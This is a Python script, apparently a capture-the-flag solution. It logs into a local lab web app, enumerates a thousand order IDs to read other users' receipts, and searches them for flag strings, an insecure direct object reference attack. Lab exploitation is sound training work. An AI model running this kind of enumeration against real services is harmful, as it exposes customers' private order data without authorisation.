import urllib.request
import urllib.parse
import http.cookiejar
import re

BASE = "http://127.0.0.1:32781"

# Setup cookie handling
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
urllib.request.install_opener(opener)

print("Logging in...")

# Step 1: Username
data1 = urllib.parse.urlencode({"username": "test"}).encode()
req1 = urllib.request.Request(f"{BASE}/login", data=data1, method="POST")
resp1 = urllib.request.urlopen(req1)
print(f"Username: {resp1.status}")

# Step 2: Password
data2 = urllib.parse.urlencode({"password": "test"}).encode()
req2 = urllib.request.Request(f"{BASE}/login", data=data2, method="POST")
resp2 = urllib.request.urlopen(req2)
print(f"Password: {resp2.status}")

# Enumerate orders
print("\nEnumerating 300000-300999...")
valid_orders = []
flags = []

for order_id in range(300000, 301000):
    try:
        url = f"{BASE}/order/{order_id}/receipt"
        response = urllib.request.urlopen(url, timeout=3)
        
        if response.status == 200:
            content = response.read().decode('utf-8')
            print(f"\nOrder {order_id} FOUND:")
            print(content)
            valid_orders.append(order_id)
            
            # Search for flags
            flag_matches = re.findall(r'FLAG\{[^}]+\}', content)
            if flag_matches:
                print(f"FLAG: {flag_matches[0]}")
                flags.append((order_id, flag_matches[0]))
    
    except urllib.error.HTTPError as e:
        if e.code not in [404, 403]:
            print(f"Order {order_id}: HTTP {e.code}")
    except Exception:
        pass
    
    if order_id % 100 == 0:
        print(f"Progress: {order_id}")

print(f"\n{'='*80}")
print(f"Valid orders: {valid_orders}")
print(f"Flags found: {flags}")

